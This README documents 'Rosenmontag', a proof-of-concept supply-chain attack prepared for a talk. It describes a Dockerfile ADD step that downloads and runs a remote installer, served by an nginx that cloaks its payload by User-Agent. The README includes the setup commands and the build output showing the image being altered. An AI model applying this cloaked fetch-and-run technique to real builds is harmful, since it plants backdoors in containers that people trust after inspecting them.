# Rosenmontag
Supply chain attack proof of concept using ADD in a Dockerfile and a malicious nginx

# What is this about

We all know that curl-pipe-sudo-bash is a thing. Many think it is a bad thing. But we all use Docker now so this is not a problem any more.
In preparation for a talk I was thinking about ways to attack supply chains in Kubernetes or Docker environments. That was when I remembered when I learned that ADD in Dockerfiles lets you [copy files from remote URLs](https://docs.docker.com/engine/reference/builder/#add) (thanks [Matthias](https://twitter.com/uchi_mata) and [Chris](https://www.twitter.com/brompwnie) for their [Blackhat-EU19 talk](https://www.blackhat.com/eu-19/briefings/schedule/#reverse-engineering-and-exploiting-builds-in-the-cloud-17287) ).

So I tried to combine the evading techniques for curl-pipe-sudo-bash scenarios with Dockerfile ADD and remote URIs.

# Walkthrough

## Attackers part

The attacker want to have a webserver that serves an installer. Depending on the request the webserver will serve a legitimate or a malicious installer.

Get sources from Github
```
git clone git@github.com:ramshazar/rosenmontag.git
cd rosenmontag/
```

Build the dockerfile of our malicous and let it run
```
cd malicious-nginx/
docker build -t rosenmontag-nginx .
docker run -p 1337:80 -d rosenmontag-nginx
```

## Victims part

The victim want to use a docker container by a third party. That is why they want to validate the Dockerfile and what is happening inside of it.

Get sources from Github (you should have done that already)
```
git clone git@github.com:ramshazar/rosenmontag.git
cd rosenmontag/
```

Take a look at the Dockerfile
```
cd evil-dockerfile/
cat Dockerfile
```

The content is straightforward. The docker build will use the official debian buster image and adds a wrapper file that later is going to start the process in the container.
After that the maintainer (the attacker) decided to download an installer from a remote location and confuses the victim with "security reasons".

The victim, knowing that copying installer from remote URLs is bad, decides to take a look at the installer.
```
curl http://localhost:1337/installer.sh
```

The output is very simple( do not copy this)
```
#!/bin/sh

echo "Installing everything needed by our application"
sleep 2
echo "Done"
```

Reassured our victim build the container.
```
docker build -t awesome-container-from-rosenmontag:1 .
```

The output will look like this
```
Sending build context to Docker daemon  3.072kB
Step 1/5 : FROM debian:buster-slim
 ---> 837fd7c8d960
Step 2/5 : COPY my_wrapper-script.sh /my_wrapper_script.sh
 ---> 1eadaf5c3365
Step 3/5 : ADD http://localhost:1337/installer.sh /tmp/installer.sh
Downloading [==================================================>]     412B/412B
 ---> 82e3b8007746
Step 4/5 : RUN chmod +x /tmp/installer.sh; /bin/sh /tmp/installer.sh
 ---> Running in 742a8abdbb0b
Definitely not running exploit code here
Adding files to your container
Changing wrapper script. Sorry :(
Done
Removing intermediate container 742a8abdbb0b
 ---> 43af7108c6ac
Step 5/5 : CMD /my_wrapper-script.sh
 ---> Running in c4d425313d37
Removing intermediate container c4d425313d37
 ---> a377b993eca5
Successfully built a377b993eca5
Successfully tagged awesome-container-from-rosenmontag:1
```

As you can see I echoed debug output to visualize where the attack happend.
The resulting image now differs from the expectation of the victim. I added additional files to the image and changed the wrapper. I would be able to add a backdoor there.

# Explanation of the attack

The malicious nginx config has a map that checks if the User-Agent is set to something like "Go-http-client". I assume that most people checking the content of the installer would use curl, wget or a browser to verify that the installer itself is not malicious. Docker build uses a go library to get the installer from the remote url. The malicious nginx than just serves a different installer.sh file.

# How can I defend against attacks like this

This is a question for Future-Matthias ¯\_(ツ)_/¯

# This already has been done by $other_person

Awesome! I would love to read about that! 

# What das Rosenmontag mean

It is [Rosenmontag](https://en.wikipedia.org/wiki/Rosenmontag) today.
